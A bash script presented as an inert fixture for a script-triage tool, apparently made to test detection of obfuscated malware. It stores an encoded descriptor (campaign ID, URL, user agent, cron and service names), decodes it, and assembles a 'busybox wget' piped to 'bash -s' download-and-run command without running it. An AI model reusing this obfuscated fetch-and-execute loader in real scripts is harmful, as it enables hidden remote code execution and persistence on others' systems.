#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_05ae5522='74,23,23,73,22,69,27,28,25,25,19,70,69,48,87,87,73,86,88,82,89,44,33,88,82,73,75,69,67,86,73,87,89,96,76,87,18,29,23,20,21,25,26,28,73,19,72,77,80,69,90,82,77,18,73,80,84,81,69,92,73,18,74,23,23,73,22,69,27,28,25,25,19,19,30,87,84,88,88,76,33,80,86,89,96,74,23,23,73,22,69,27,28,25,25,17,82,75,77,69,84,81,69,71,33,72,77,67,82,75,77,69,84,81,69,71,96,21,33,88,82,89,83,71,67,73,75,69,88,87,96,88,89,83,72,88,87,67,88,73,75,91,67,92,83,70,93,87,89,70,33,86,73,88,84,69,72,69,96,73,84,77,84,67,76,71,88,69,84,87,77,72,16,73,88,83,81,73,86,67,73,86,77,89,85,71,69,33,87,84,73,88,87,96,21,33,90'
  readonly Codec_05ae5522='reversed_decimal|subtract_modulo_256|1c'

  Load_05ae5522() {
    v_a19c=()
    local IFS=',' v_e598
    local -a pieces
    read -r -a pieces <<< "${Material_05ae5522}"
    for ((v_e598=${#pieces[@]}-1; v_e598>=0; v_e598--)); do v_a19c+=("${pieces[v_e598]}"); done
  }

  Decode_05ae5522() {
    v_b27e=()
    local v_e598
    for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
      v_b27e+=("$(((v_a19c[v_e598] + 28) % 256))")
    done
  }

  Recover_05ae5522() {
    local -a v_a19c v_b27e
    local v_c304 v_d41a v_b803 v_e598
    local -a compass=(north south); v_d41a="$(IFS=:; printf '%s' "${compass[*]}")"
    Load_05ae5522
    local decode_target=Decode_05ae5522; "$decode_target"
    v_c304=''
    local octal character
    for v_e598 in "${!v_b27e[@]}"; do
      printf -v octal '%03o' "${v_b27e[v_e598]}"
      printf -v character '%b' "\\$octal"
      v_c304+="$character"
    done
    printf '%s\n' "$v_c304"
  }

  Inspect_05ae5522() { local recovered field; local -a fields; recovered="$(Recover_05ae5522)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_05ae5522() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_05ae5522)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(busybox wget -qO- "$url")
    local -a interpreter=(bash -s)
    declare -p request_command interpreter
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_05ae5522; fi
